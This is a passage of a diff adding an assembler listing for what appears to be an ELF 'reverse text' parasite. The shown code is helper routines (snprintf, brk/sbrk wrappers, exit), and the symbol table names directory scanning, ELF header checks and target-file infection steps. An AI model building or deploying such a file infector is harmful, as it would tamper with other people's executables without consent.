+ 944 0add 4989F5   	    movq %rsi, %r13     # 缓冲区大小
+ 945 0ae0 4989D6   	    movq %rdx, %r14     # 格式化字符串
+ 946 0ae3 4989CF   	    movq %rcx, %r15     # 第一个参数
+ 947              	     # 初始化
+ 948 0ae6 4D31C0   	   xorq %r8, %r8       # 已写入字符计数
+ 949              	   parse_format:
+ 950              	    # 检查是否到达字符串结尾
+ 951 0ae9 41803E00 	    cmpb $0, (%r14)
+ 952 0aed 0F848D00 	    je done
+ 952      0000
+ 953              	    
+ 954              	    # 检查缓冲区是否已满
+ 955 0af3 4D39E8   	    cmpq %r13, %r8
+ 956 0af6 0F838400 	    jae done
+ 956      0000
+ 957              	    
+ 958              	    # 检查是否是格式说明符
+ 959 0afc 41803E25 	    cmpb $'%', (%r14)
+ 960 0b00 7412     	    je handle_format
+ 961              	    
+ 962              	    # 普通字符直接复制
+ 963 0b02 418A06   	    movb (%r14), %al
+ 964 0b05 41880424 	    movb %al, (%r12)
+ 965 0b09 49FFC4   	    incq %r12
+ 966 0b0c 49FFC6   	    incq %r14
+ 967 0b0f 49FFC0   	    incq %r8
+ 968 0b12 EBD5     	    jmp parse_format
+ 969              	
+ 970              	handle_format:
+ 971 0b14 49FFC6   	    incq %r14
+ 972              	    
+ 973              	    # 检查 %d
+ 974 0b17 41803E64 	    cmpb $'d', (%r14)
+ 975 0b1b 740E     	    je handle_decimal
+ 976              	    
+ 977              	    # 检查 %s
+ 978 0b1d 41803E73 	    cmpb $'s', (%r14)
+ 979 0b21 741E     	    je handle_string
+ 980              	    
+ 981              	    # 检查 %x
+ 982 0b23 41803E78 	    cmpb $'x', (%r14)
+ 983 0b27 743E     	    je handle_hex
+ 984              	    
+ 985              	    # 非法格式，跳过
+ 986 0b29 EBBE     	    jmp parse_format
+ 987              	
+GAS LISTING ./reverse_text.s 			page 23
+
+
+ 988              	handle_decimal:
+ 989              	    # 转换整数
+ 990 0b2b 4C89FF   	    movq %r15, %rdi     # 第一个参数作为转换对象
+ 991 0b2e 4C89E6   	    movq %r12, %rsi     # 目标缓冲区
+ 992 0b31 E8F80000 	    call int_to_string
+ 992      00
+ 993              	    
+ 994              	    # 更新计数器和缓冲区指针
+ 995 0b36 4901C0   	    addq %rax, %r8
+ 996 0b39 4901C4   	    addq %rax, %r12
+ 997              	    
+ 998 0b3c 49FFC6   	    incq %r14           # 跳过 'd'
+ 999 0b3f EBA8     	    jmp parse_format
+ 1000              	
+ 1001              	handle_string:
+ 1002              	    # 处理字符串
+ 1003 0b41 4C89FF   	    movq %r15, %rdi     # 字符串指针
+ 1004 0b44 4C89E6   	    movq %r12, %rsi     # 目标缓冲区
+ 1005              	    /***************modify by owen jiang for buffer len**************/
+ 1006              	    #movq %r13, %rdx     # 剩余缓冲区大小 comment by owen jiang
+ 1007 0b47 4151     	    push %r9
+ 1008 0b49 4D31C9   	    xor %r9,%r9
+ 1009 0b4c 4D89E9   	    mov %r13,%r9
+ 1010 0b4f 4D29C1   	    sub %r8,%r9 
+ 1011 0b52 4C89CA   	    mov %r9,%rdx 
+ 1012 0b55 4159     	    pop %r9 
+ 1013              	    /**********************************************************************************/
+ 1014 0b57 E8390000 	    call copy_string
+ 1014      00
+ 1015              	    
+ 1016              	    # 更新计数器和缓冲区指针
+ 1017 0b5c 4901C0   	    addq %rax, %r8
+ 1018 0b5f 4901C4   	    addq %rax, %r12
+ 1019              	    
+ 1020 0b62 49FFC6   	    incq %r14           # 跳过 's'
+ 1021 0b65 EB82     	    jmp parse_format
+ 1022              	
+ 1023              	handle_hex:
+ 1024              	    # 转换十六进制
+ 1025 0b67 4C89FF   	    movq %r15, %rdi     # 第一个参数作为转换对象
+ 1026 0b6a 4C89E6   	    movq %r12, %rsi     # 目标缓冲区
+ 1027 0b6d E8480000 	    call hex_to_string
+ 1027      00
+ 1028              	    
+ 1029              	    # 更新计数器和缓冲区指针
+ 1030 0b72 4901C0   	    addq %rax, %r8
+ 1031 0b75 4901C4   	    addq %rax, %r12
+ 1032              	    
+ 1033 0b78 49FFC6   	    incq %r14           # 跳过 'x'
+ 1034 0b7b E969FFFF 	    jmp parse_format
+ 1034      FF
+ 1035              	
+ 1036              	done:
+ 1037              	    # 添加字符串结尾
+ 1038 0b80 41C60424 	    movb $0, (%r12)
+ 1038      00
+ 1039              	    
+GAS LISTING ./reverse_text.s 			page 24
+
+
+ 1040              	    # 返回写入的字符数
+ 1041 0b85 4C89C0   	    movq %r8, %rax
+ 1042              	    
+ 1043              	    # 恢复寄存器
+ 1044 0b88 415F     	    popq %r15
+ 1045 0b8a 415E     	    popq %r14
+ 1046 0b8c 415D     	    popq %r13
+ 1047 0b8e 415C     	    popq %r12
+ 1048              	    
+ 1049              	    # 恢复栈帧
+ 1050 0b90 4889EC   	    movq %rbp, %rsp
+ 1051 0b93 5D       	    popq %rbp
+ 1052 0b94 C3       	    ret
+ 1053              	
+ 1054              	# 字符串复制函数
+ 1055              	# rdi: 源字符串
+ 1056              	# rsi: 目标缓冲区
+ 1057              	# rdx: 剩余缓冲区大小
+ 1058              	# 返回：复制的字符数
+ 1059              	copy_string:
+ 1060 0b95 55       	    pushq %rbp
+ 1061 0b96 4889E5   	    movq %rsp, %rbp
+ 1062              	    
+ 1063 0b99 4831C0   	    xorq %rax, %rax     # 计数器
+ 1064              	    
+ 1065              	copy_loop:
+ 1066              	    # 检查是否到达字符串结尾
+ 1067 0b9c 803F00   	    cmpb $0, (%rdi)
+ 1068 0b9f 7414     	    je copy_done
+ 1069              	    
+ 1070              	    # 检查缓冲区是否已满
+ 1071 0ba1 4839D0   	    cmpq %rdx, %rax
+ 1072 0ba4 730F     	    jae copy_done
+ 1073              	    
+ 1074              	    # 复制字符
+ 1075 0ba6 8A0F     	    movb (%rdi), %cl
+ 1076 0ba8 880E     	    movb %cl, (%rsi)
+ 1077              	    
+ 1078              	    # 更新指针和计数器
+ 1079 0baa 48FFC7   	    incq %rdi
+ 1080 0bad 48FFC6   	    incq %rsi
+ 1081 0bb0 48FFC0   	    incq %rax
+ 1082              	    
+ 1083 0bb3 EBE7     	    jmp copy_loop
+ 1084              	
+ 1085              	copy_done:
+ 1086 0bb5 4889EC   	    movq %rbp, %rsp
+ 1087 0bb8 5D       	    popq %rbp
+ 1088 0bb9 C3       	    ret
+ 1089              	
+ 1090              	# 十六进制转换函数
+ 1091              	# rdi: 要转换的整数
+ 1092              	# rsi: 目标缓冲区
+ 1093              	# 返回：转换的字符数
+ 1094              	hex_to_string:
+ 1095 0bba 55       	    pushq %rbp
+ 1096 0bbb 4889E5   	    movq %rsp, %rbp
+GAS LISTING ./reverse_text.s 			page 25
+
+
+ 1097 0bbe 4883E4F0 	    andq $0xfffffffffffffff0,%rsp
+ 1098              	    
+ 1099              	    # 分配本地缓冲区
+ 1100 0bc2 4883EC20 	    subq $32, %rsp
+ 1101              	    
+ 1102              	    # 保存目标缓冲区
+ 1103 0bc6 4989F2   	    movq %rsi, %r10
+ 1104              	    
+ 1105              	    # 转换整数到十六进制字符串（反向）
+ 1106 0bc9 4C8D4DFF 	    leaq -1(%rbp), %r9  # 临时缓冲区末尾
+ 1107 0bcd 4889F8   	    movq %rdi, %rax
+ 1108 0bd0 48C7C110 	    movq $16, %rcx
+ 1108      000000
+ 1109              	convert_hex_digit:
+ 1110 0bd7 4889C2   	    movq %rax, %rdx
+ 1111 0bda 4883E20F 	    andq $0xf, %rdx     # 取低4位
+ 1112              	    
+ 1113              	    # 转换为十六进制字符
+ 1114 0bde 4883FA0A 	    cmpq $10, %rdx
+ 1115 0be2 7C05     	    jl numeric_hex
+ 1116 0be4 80C257   	    addb $'a'-10, %dl   # 处理 a-f
+ 1117 0be7 EB03     	    jmp store_hex_digit
+ 1118              	numeric_hex:
+ 1119 0be9 80C230   	    addb $'0', %dl      # 处理 0-9
+ 1120              	store_hex_digit:
+ 1121 0bec 418811   	    movb %dl, (%r9)
+ 1122 0bef 49FFC9   	    decq %r9
+ 1123              	    
+ 1124 0bf2 48C1E804 	    shrq $4, %rax       # 右移4位
+ 1125 0bf6 4885C0   	    testq %rax, %rax
+ 1126 0bf9 75DC     	    jnz convert_hex_digit
+ 1127              	    
+ 1128              	    # 复制转换后的字符串
+ 1129 0bfb 49FFC1   	    incq %r9
+ 1130              	    
+ 1131              	    # 计算字符串长度
+ 1132 0bfe 488D4DFF 	    leaq -1(%rbp), %rcx
+ 1133 0c02 4C29C9   	    subq %r9, %rcx
+ 1134 0c05 48FFC1   	    incq %rcx
+ 1135              	    /****add by owen jiang  for check len of buffer *****/
+ 1136 0c08 4151     	    push %r9
+ 1137 0c0a 4D31C9   	    xor %r9,%r9
+ 1138 0c0d 4D89E9   	    mov %r13,%r9
+ 1139 0c10 4D29C1   	    sub %r8,%r9
+ 1140 0c13 4939C9   	    cmpq %rcx,%r9
+ 1141 0c16 7303     	    jae .osis_snprintf_store_hex_digit_check2
+ 1142 0c18 4C89C9   	    mov %r9,%rcx 
+ 1143              	
+ 1144              	    .osis_snprintf_store_hex_digit_check2: 
+ 1145 0c1b 4159     	    pop %r9 
+ 1146              	    /******************************/
+ 1147              	    
+ 1148              	    # 复制到目标缓冲区
+ 1149 0c1d 4889F7   	    mov %rsi,%rdi
+ 1150 0c20 4C89CE   	    mov %r9,%rsi
+ 1151 0c23 4889C8   	    mov %rcx,%rax
+ 1152 0c26 FC       	    cld
+GAS LISTING ./reverse_text.s 			page 26
+
+
+ 1153 0c27 F3A4     	    rep movsb
+ 1154              	    
+ 1155              	    # 恢复栈帧
+ 1156 0c29 4889EC   	    movq %rbp, %rsp
+ 1157 0c2c 5D       	    popq %rbp
+ 1158 0c2d C3       	    ret
+ 1159              	
+ 1160              	# 之前的 int_to_string 函数保持不变
+ 1161              	int_to_string:
+ 1162              	    # 保存栈帧
+ 1163 0c2e 55       	    pushq %rbp
+ 1164 0c2f 4889E5   	    movq %rsp, %rbp
+ 1165 0c32 4883E4F0 	    andq $0xfffffffffffffff0,%rsp
+ 1166              	    
+ 1167              	    # 分配本地缓冲区
+ 1168 0c36 4883EC20 	    subq $32, %rsp
+ 1169              	    
+ 1170              	    # 保存目标缓冲区
+ 1171 0c3a 4989F2   	    movq %rsi, %r10
+ 1172              	    
+ 1173              	    # 处理负数
+ 1174 0c3d 4D31DB   	    xorq %r11, %r11     # 符号标志
+ 1175 0c40 4885FF   	    testq %rdi, %rdi
+ 1176 0c43 790D     	    jns positive
+ 1177              	    
+ 1178              	    # 负数处理
+ 1179 0c45 41C6022D 	    movb $'-', (%r10)
+ 1180 0c49 49FFC2   	    incq %r10
+ 1181 0c4c 49FFC3   	    incq %r11
+ 1182 0c4f 48F7DF   	    negq %rdi
+ 1183              	
+ 1184              	positive:
+ 1185              	    # 转换整数到字符串（反向）
+ 1186 0c52 4C8D4DFF 	    leaq -1(%rbp), %r9  # 临时缓冲区末尾
+ 1187 0c56 4889F8   	    movq %rdi, %rax
+ 1188 0c59 48C7C10A 	    movq $10, %rcx
+ 1188      000000
+ 1189              	
+ 1190              	convert_digit:
+ 1191 0c60 4831D2   	    xorq %rdx, %rdx
+ 1192 0c63 48F7F1   	    divq %rcx
+ 1193 0c66 80C230   	    addb $'0', %dl
+ 1194 0c69 418811   	    movb %dl, (%r9)
+ 1195 0c6c 49FFC9   	    decq %r9
+ 1196              	    
+ 1197 0c6f 4885C0   	    testq %rax, %rax
+ 1198 0c72 75EC     	    jnz convert_digit
+ 1199              	    
+ 1200              	    # 复制转换后的字符串
+ 1201 0c74 49FFC1   	    incq %r9
+ 1202              	    
+ 1203              	    # 计算字符串长度
+ 1204 0c77 488D4DFF 	    leaq -1(%rbp), %rcx
+ 1205 0c7b 4C29C9   	    subq %r9, %rcx
+ 1206 0c7e 48FFC1   	    incq %rcx
+ 1207              	    /****add by owen jiang  for check len of buffer *****/
+ 1208 0c81 4151     	    push %r9
+GAS LISTING ./reverse_text.s 			page 27
+
+
+ 1209 0c83 4D31C9   	    xor %r9,%r9
+ 1210 0c86 4D89E9   	    mov %r13,%r9
+ 1211 0c89 4D29C1   	    sub %r8,%r9
+ 1212 0c8c 4939C9   	    cmpq %rcx,%r9
+ 1213 0c8f 7303     	    jae .osis_snprintf_convert_digit_check1
+ 1214 0c91 4C89C9   	    mov %r9,%rcx 
+ 1215              	
+ 1216              	    .osis_snprintf_convert_digit_check1: 
+ 1217 0c94 4159     	    pop %r9 
+ 1218              	    /******************************/
+ 1219              	    
+ 1220              	    # 复制到目标缓冲区
+ 1221 0c96 4889F7   	    mov %rsi,%rdi
+ 1222 0c99 4C89CE   	    mov %r9,%rsi
+ 1223 0c9c 4889C8   	    mov %rcx,%rax
+ 1224 0c9f FC       	    cld
+ 1225 0ca0 F3A4     	    rep movsb
+ 1226              	    
+ 1227              	    # 返回写入的字符数
+ 1228              	    #movq %rcx, %rax
+ 1229              	    
+ 1230              	    # 恢复栈帧
+ 1231 0ca2 4889EC   	    movq %rbp, %rsp
+ 1232 0ca5 5D       	    popq %rbp
+ 1233 0ca6 C3       	    ret
+ 1234              	
+ 1235              	/********************************end of osis_snprintf**************************************/
+ 1236              	
+ 1237              	
+ 1238              	/********************************osis_sbrk func*******************************************/
+ 1239              	/* osis_sbrk 函数实现
+ 1240              	rdi: intptr_t inc
+ 1241              	*/
+ 1242              	.type osis_sbrk @function
+ 1243              	.global osis_sbrk
+ 1244              	osis_sbrk:
+ 1245 0ca7 55       	        pushq %rbp
+ 1246 0ca8 4889E5   	        movq %rsp, %rbp
+ 1247 0cab 4883E4F0 	        andq $0xfffffffffffffff0,%rsp
+ 1248 0caf 4889FE   	        mov    %rdi,%rsi
+ 1249 0cb2 BF000000 	        movl    $0x0,%edi
+ 1249      00
+ 1250 0cb7 E8000000 	        callq  osis_sys_brk
+ 1250      00
+ 1251 0cbc 4989C0   	        mov    %rax,%r8
+ 1252 0cbf 4885C0   	        test   %rax,%rax
+ 1253 0cc2 7415     	        je     .osis_sbrk_err
+ 1254              	
+ 1255 0cc4 4801F0   	        add    %rsi,%rax
+ 1256 0cc7 4889C7   	        mov    %rax,%rdi
+ 1257 0cca 4989C1   	        mov    %rax,%r9
+ 1258 0ccd E8000000 	        callq  osis_sys_brk
+ 1258      00
+ 1259              	
+ 1260 0cd2 4C39C8   	        cmp    %r9,%rax
+ 1261 0cd5 7502     	        jne    .osis_sbrk_err
+ 1262 0cd7 EB07     	        jmp   .osis_sbrk_endl
+GAS LISTING ./reverse_text.s 			page 28
+
+
+ 1263              	        .osis_sbrk_err:
+ 1264 0cd9 48C7C0FF 	        mov    $0xffffffffffffffff,%rax
+ 1264      FFFFFF
+ 1265              	
+ 1266              	        .osis_sbrk_endl:
+ 1267 0ce0 4889EC   	        movq %rbp, %rsp
+ 1268 0ce3 5D       	        popq %rbp
+ 1269 0ce4 C3       	        ret
+ 1270              	
+ 1271              	
+ 1272              	/********************************end of osis_sbrk func*******************************************/
+ 1273              	
+ 1274              	/********************************osis_sys_brk func*******************************************/
+ 1275              	/* osis_sbrk 函数实现
+ 1276              	rdi: void* addr
+ 1277              	*/
+ 1278              	.type osis_sys_brk @function
+ 1279              	.global osis_sys_brk
+ 1280              	osis_sys_brk:
+ 1281 0ce5 55       	    pushq %rbp
+ 1282 0ce6 4889E5   	    movq %rsp, %rbp
+ 1283 0ce9 4883E4F0 	    andq $0xfffffffffffffff0,%rsp
+ 1284              	    #mov    %rdi,-0x28(%rbp)#redzone
+ 1285 0ced B80C0000 	    movl    $0xc,%eax
+ 1285      00
+ 1286 0cf2 0F05     	    syscall
+ 1287 0cf4 4889EC   	    movq %rbp, %rsp
+ 1288 0cf7 5D       	    popq %rbp
+ 1289 0cf8 C3       	    ret
+ 1290              	
+ 1291              	
+ 1292              	
+ 1293              	/********************************end of osiosis_sys_brks_sbrk func*********************************
+ 1294              	
+ 1295              	/********************************osis_brk func*******************************************/
+ 1296              	/* osis_brk 函数实现
+ 1297              	rdi: void* addr
+ 1298              	*/
+ 1299              	.type osis_brk @function
+ 1300              	.global osis_brk
+ 1301              	osis_brk:
+ 1302 0cf9 55       	    pushq %rbp
+ 1303 0cfa 4889E5   	    movq %rsp, %rbp
+ 1304 0cfd 4883E4F0 	    andq $0xfffffffffffffff0,%rsp
+ 1305              	    #mov    %rdi,-0x28(%rbp)#redzone
+ 1306 0d01 B80C0000 	    movl    $0xc,%eax
+ 1306      00
+ 1307 0d06 0F05     	    syscall
+ 1308 0d08 4885C0   	    test %rax,%rax
+ 1309 0d0b 7405     	    je .osis_brk_err 
+ 1310 0d0d 4831C0   	    xor %rax,%rax
+ 1311 0d10 EB07     	    jmp osis_brk_endl 
+ 1312              	    .osis_brk_err:
+ 1313 0d12 48C7C0FF 	    mov    $0xffffffffffffffff,%rax
+ 1313      FFFFFF
+ 1314              	    osis_brk_endl:
+ 1315 0d19 4889EC   	    movq %rbp, %rsp
+GAS LISTING ./reverse_text.s 			page 29
+
+
+ 1316 0d1c 5D       	    popq %rbp
+ 1317 0d1d C3       	    ret
+ 1318              	
+ 1319              	
+ 1320              	
+ 1321              	/********************************end of osis_brk func*******************************************/
+ 1322              	
+ 1323              	
+ 1324 0d1e 54686973 	osis_reverst_id:.ascii "This is a  identification msg by osis_reverse_text_test.\n"
+ 1324      20697320 
+ 1324      61202069 
+ 1324      64656E74 
+ 1324      69666963 
+ 1325              	osis_reverst_id_end:
+ 1326              	.equ osis_reverst_id_len,osis_reverst_id_end-osis_reverst_id
+ 1327              	osis_reverse_parasite_size:
+ 1328 0d57 90785634 	.quad 0x1234567890
+ 1328      12000000 
+ 1329              	osis_reverse_magic:
+ 1330 0d5f 10325476 	.quad 0x9876543210
+ 1330      98000000 
+ 1331 0d67 660F1F84 	.align 16
+ 1331      00000000 
+ 1331      00
+ 1332              	._start_endl:
+ 1333 0d70 4889EC   	mov %rbp,%rsp
+ 1334 0d73 5D       	pop %rbp
+ 1335 0d74 9D       	popfq
+ 1336 0d75 415F     	pop %r15
+ 1337 0d77 415E     	pop %r14
+ 1338 0d79 415D     	pop %r13
+ 1339 0d7b 415C     	pop %r12
+ 1340 0d7d 415B     	pop %r11
+ 1341 0d7f 415A     	pop %r10
+ 1342 0d81 4159     	pop %r9
+ 1343 0d83 4158     	pop %r8
+ 1344 0d85 5E       	pop %rsi
+ 1345 0d86 5F       	pop %rdi
+ 1346 0d87 5A       	pop %rdx
+ 1347 0d88 59       	pop %rcx
+ 1348 0d89 5B       	pop %rbx
+ 1349 0d8a 58       	pop %rax
+ 1350 0d8b 0F1F4400 	.align 16
+ 1350      00
+ 1351              	._start_endl_exit:
+ 1352 0d90 4831FF   	xor %rdi,%rdi       
+ 1353 0d93 48C7C03C 	movq $60, %rax   
+ 1353      000000
+ 1354 0d9a 0F05     	syscall
+ 1355 0d9c 0F1F4000 	.align 16
+GAS LISTING ./reverse_text.s 			page 30
+
+
+DEFINED SYMBOLS
+    ./reverse_text.s:3      .text:0000000000000000 _start
+    ./reverse_text.s:1351   .text:0000000000000d90 ._start_endl_exit
+    ./reverse_text.s:46     .text:0000000000000057 .osis_get_entry
+    ./reverse_text.s:822    .text:00000000000009eb osis_memset_rax
+    ./reverse_text.s:931    .text:0000000000000aca osis_snprintf
+    ./reverse_text.s:1332   .text:0000000000000d70 ._start_endl
+    ./reverse_text.s:103    .text:0000000000000126 ._start_get_dirent
+    ./reverse_text.s:814    .text:00000000000009e6 ._start_out_get_dirent
+    ./reverse_text.s:114    .text:0000000000000161 ._start_out_get_dirent_bpos
+    ./reverse_text.s:811    .text:00000000000009e1 ._start_out_get_dirent_bpos_out
+    ./reverse_text.s:198    .text:00000000000002b9 ._start_out_get_dirent_bpos_cmp1
+    ./reverse_text.s:245    .text:0000000000000313 ._start_out_get_dirent_bpos_stat_1_continue
+    ./reverse_text.s:1244   .text:0000000000000ca7 osis_sbrk
+    ./reverse_text.s:276    .text:0000000000000352 ._start_out_get_dirent_bpos_brk_1_err
+    ./reverse_text.s:282    .text:0000000000000367 ._start_out_get_dirent_bpos_brk_1_continue
+    ./reverse_text.s:300    .text:00000000000003b0 ._start_out_get_dirent_bpos_read_1_contine
+    ./reverse_text.s:292    .text:000000000000038f _start_out_get_dirent_bpos_read_1_err
+    ./reverse_text.s:1301   .text:0000000000000cf9 osis_brk
+    ./reverse_text.s:322    .text:00000000000003c5 ._start_out_get_dirent_bpos_check_elf_hdr_1
+    ./reverse_text.s:336    .text:00000000000003e5 ._start_out_get_dirent_bpos_check_elf_hdr_1_fail
+    ./reverse_text.s:344    .text:0000000000000406 ._start_out_get_dirent_bpos_check_elf_hdr_1_succ
+    ./reverse_text.s:345    .text:0000000000000406 ._start_out_get_dirent_bpos_anlasize_elf_phdr
+    ./reverse_text.s:785    .text:00000000000009bb ._start_out_get_dirent_bpos_anlasize_elf_phdr_fail
+    ./reverse_text.s:393    .text:00000000000004b6 ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1
+    ./reverse_text.s:497    .text:00000000000005fb ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_out
+    ./reverse_text.s:405    .text:00000000000004ea ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_test_1_jz
+    ./reverse_text.s:406    .text:00000000000004ea ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_test_1_jz_out
+    ./reverse_text.s:412    .text:0000000000000501 ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type
+    ./reverse_text.s:429    .text:000000000000052d ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_load
+    ./reverse_text.s:418    .text:000000000000050d ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_note
+    ./reverse_text.s:423    .text:0000000000000519 ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_note_test_1_out
+    ./reverse_text.s:440    .text:000000000000055b ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_test_2_jne_out
+    ./reverse_text.s:449    .text:0000000000000579 ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_cmp_vaddr_out
+    ./reverse_text.s:458    .text:0000000000000592 ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text
+    ./reverse_text.s:1329   .text:0000000000000d5f osis_reverse_magic
+    ./reverse_text.s:786    .text:00000000000009bb ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_out_1
+    ./reverse_text.s:476    .text:00000000000005e0 ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_cmp_1_jl
+    ./reverse_text.s:477    .text:00000000000005e0 ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_cmp_1_out
+    ./reverse_text.s:485    .text:00000000000005f6 ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_test_2_je
+    ./reverse_text.s:486    .text:00000000000005f6 ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_find_text_test_2_je_out
+    ./reverse_text.s:487    .text:00000000000005f6 ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_load_out
+    ./reverse_text.s:498    .text:00000000000005fb ._start_out_get_dirent_bpos_integrate_target_phdr
+    ./reverse_text.s:524    .text:0000000000000662 ._start_out_get_dirent_bpos_integrate_target_phdr_test_1_out
+    ./reverse_text.s:546    .text:00000000000006a9 ._start_out_get_dirent_bpos_integrate_target_shdr
+    ./reverse_text.s:548    .text:00000000000006a9 ._start_out_get_dirent_bpos_integrate_target_shdr_check_ehdr
+    ./reverse_text.s:787    .text:00000000000009bb ._start_out_get_dirent_bpos_integrate_target_shdr_out_1
+    ./reverse_text.s:563    .text:00000000000006dd ._start_out_get_dirent_bpos_integrate_target_shdr_alloc_new_shent
+    ./reverse_text.s:788    .text:00000000000009bb ._start_out_get_dirent_bpos_integrate_target_shdr_alloc_new_shent_out_1
+    ./reverse_text.s:623    .text:00000000000007ab ._start_out_get_dirent_bpos_adjust_target_ehdr
+    ./reverse_text.s:635    .text:00000000000007d9 ._start_out_get_dirent_bpos_generate_file
+    ./reverse_text.s:789    .text:00000000000009bb ._start_out_get_dirent_bpos_generate_file_out_1
+    ./reverse_text.s:856    .text:0000000000000a2c .omr_001
+    ./reverse_text.s:847    .text:0000000000000a14 .omr_000
+    ./reverse_text.s:915    .text:0000000000000ac5 osis_memset_rax_endl
+    ./reverse_text.s:878    .text:0000000000000a70 .omr_001_0
+    ./reverse_text.s:881    .text:0000000000000a75 .omr_001_1
+GAS LISTING ./reverse_text.s 			page 31
+
+
+    ./reverse_text.s:885    .text:0000000000000a7d .omr_001_2
+    ./reverse_text.s:889    .text:0000000000000a86 .omr_001_3
+    ./reverse_text.s:894    .text:0000000000000a93 .omr_001_4
+    ./reverse_text.s:898    .text:0000000000000a9b .omr_001_5
+    ./reverse_text.s:903    .text:0000000000000aa7 .omr_001_6
+    ./reverse_text.s:908    .text:0000000000000ab4 .omr_001_7
+    ./reverse_text.s:949    .text:0000000000000ae9 parse_format
+    ./reverse_text.s:1036   .text:0000000000000b80 done
+    ./reverse_text.s:970    .text:0000000000000b14 handle_format
+    ./reverse_text.s:988    .text:0000000000000b2b handle_decimal
+    ./reverse_text.s:1001   .text:0000000000000b41 handle_string
+    ./reverse_text.s:1023   .text:0000000000000b67 handle_hex
+    ./reverse_text.s:1161   .text:0000000000000c2e int_to_string
+    ./reverse_text.s:1059   .text:0000000000000b95 copy_string
+    ./reverse_text.s:1094   .text:0000000000000bba hex_to_string
+    ./reverse_text.s:1065   .text:0000000000000b9c copy_loop
+    ./reverse_text.s:1085   .text:0000000000000bb5 copy_done
+    ./reverse_text.s:1109   .text:0000000000000bd7 convert_hex_digit
+    ./reverse_text.s:1118   .text:0000000000000be9 numeric_hex
+    ./reverse_text.s:1120   .text:0000000000000bec store_hex_digit
+    ./reverse_text.s:1144   .text:0000000000000c1b .osis_snprintf_store_hex_digit_check2
+    ./reverse_text.s:1184   .text:0000000000000c52 positive
+    ./reverse_text.s:1190   .text:0000000000000c60 convert_digit
+    ./reverse_text.s:1216   .text:0000000000000c94 .osis_snprintf_convert_digit_check1
+    ./reverse_text.s:1280   .text:0000000000000ce5 osis_sys_brk
+    ./reverse_text.s:1263   .text:0000000000000cd9 .osis_sbrk_err
+    ./reverse_text.s:1266   .text:0000000000000ce0 .osis_sbrk_endl
+    ./reverse_text.s:1312   .text:0000000000000d12 .osis_brk_err
+    ./reverse_text.s:1314   .text:0000000000000d19 osis_brk_endl
+    ./reverse_text.s:1324   .text:0000000000000d1e osis_reverst_id
+    ./reverse_text.s:1325   .text:0000000000000d57 osis_reverst_id_end
+    ./reverse_text.s:1326   *ABS*:0000000000000039 osis_reverst_id_len
+    ./reverse_text.s:1327   .text:0000000000000d57 osis_reverse_parasite_size
+
+NO UNDEFINED SYMBOLS
